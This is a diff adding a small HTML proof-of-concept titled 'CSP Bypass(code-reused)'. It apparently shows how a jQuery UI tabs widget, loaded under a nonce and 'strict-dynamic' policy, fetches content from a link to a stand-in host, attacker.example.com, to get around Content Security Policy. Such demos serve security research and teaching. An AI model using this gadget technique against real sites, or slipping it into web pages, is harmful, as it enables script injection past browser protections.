@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CSP Bypass(code-reused)</title>
+    <!-- <meta http-equiv=content-security-policy content="style-src code.jquery.com; script-src 'nonce-secret123' 'strict-dynamic'; "> -->
+    <link rel="stylesheet" href="//code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">
+    <script nonce="secret123" src="https://code.jquery.com/jquery-3.1.1.js"></script>
+    <script nonce="secret123" src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+    <script nonce="secret123">
+    $( function() {
+        $( "#tabs" ).tabs();
+    } );
+    </script>
+</head>
+
+<body>
+    <div id=tabs><ul><li><a href=http://attacker.example.com/shout/></a></li></ul></div>
+</body>
+</body>
+
+</html>
